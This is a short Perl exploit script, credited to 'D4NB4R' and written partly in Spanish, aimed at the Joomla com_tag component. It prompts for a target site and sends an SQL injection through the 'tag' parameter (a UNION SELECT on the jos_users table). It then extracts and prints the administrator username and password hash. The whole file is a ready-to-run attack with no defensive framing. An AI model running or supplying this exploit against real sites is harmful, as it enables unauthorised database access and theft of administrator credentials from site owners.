 #!/usr/bin/perl -w
    # Joomla Component (tag) Remote SQL Exploit
    #----------------------------------------------------------------------------#
 
    ########################################
    print "\t\t\n\n";
print "\t\n";
print "\t            Daniel Barragan  D4NB4R                \n";
print "\t                                                   \n";
print "\t      Joomla com_tag Remote Sql Exploit \n";
print "\t\n\n";
 
use LWP::UserAgent;
print "\nIngrese el Sitio:[http://wwww.site.com/path/]: ";
 
chomp(my $target=<STDIN>);
 
    #the username of  joomla
    $user="username";
    #the pasword of  joomla
    $pass="password";
    #the tables of joomla
    $table="jos_users";
    $d4n="com_tag&task";
    $component="tag&lang=es";
     
    $b = LWP::UserAgent->new() or die "Could not initialize browser\n";
    $b->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');
     
    $host = $target ."index.php?option=".$d4n."=".$component."&tag=999999.9' union all select 1,concat(0x3c757365723e,".$user.",0x3c757365723e3c706173733e,".$pass.",0x3c706173733e)+from ".$table."--+a";
    $res = $b->request(HTTP::Request->new(GET=>$host));
    $answer = $res->content;
     
    if ($answer =~ /<user>(.*?)<user>/){
            print "\nLos Datos Extraidos son:\n";
      print "\n
      
* Admin User : $1";
      
    }
     
    if ($answer =~/<pass>(.*?)<pass>/){print "\n
      
* Admin Hash : $1\n\n";
      
    print "\t\t#   El Exploit aporto usuario y password   #\n\n";}
    else{print "\n[-] Exploit Failed, Intente manualmente...\n";}
    
     
